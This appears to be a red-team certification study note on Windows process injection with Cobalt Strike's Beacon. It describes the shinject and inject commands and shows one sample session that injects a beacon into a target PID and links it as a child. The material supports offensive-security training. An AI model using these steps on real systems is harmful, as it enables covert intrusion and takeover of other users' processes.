
Process injection allows us to inject arbitrary shellcode into a process of our choosing.  You can only inject into processes that you can obtain a handle to with enough privileges to write into its memory.  In a non-elevated context, which usually limits you to your own processes.  In an elevated context, this includes processes owned by other users.

## 🖊️ via Cobalt Strike

Beacon has two main injection commands - `shinject` and `inject`.


#### 📔 shinject

`shinject` allows you to inject any arbitrary shellcode from a binary file on your attacking machine. 

####  📗 inject

`inject` will inject a full Beacon payload for the specified listener.
Example, injecting a process and using a TCP listener to receive the call:

```
beacon> inject 4464 x64 tcp-local
[*] Tasked beacon to inject windows/beacon_bind_tcp (127.0.0.1:4444) into 4464 (x64)
[+] established link to child beacon: 10.10.123.102
```

- 4464 is the target PID.
- x64 is the architecture of the process.
- tcp-local is the listener name.

The command will also automatically attempt to connect to the child if a P2P listener is used.  The resulting Beacon will run with the full privilege of the user who owns the process.

![[injection.png]]


### ⚠ Opsec




### Properties
---
📆 created   {{14-02-2024}} 10:16
🏷️ tags: #redteam #crto 

---

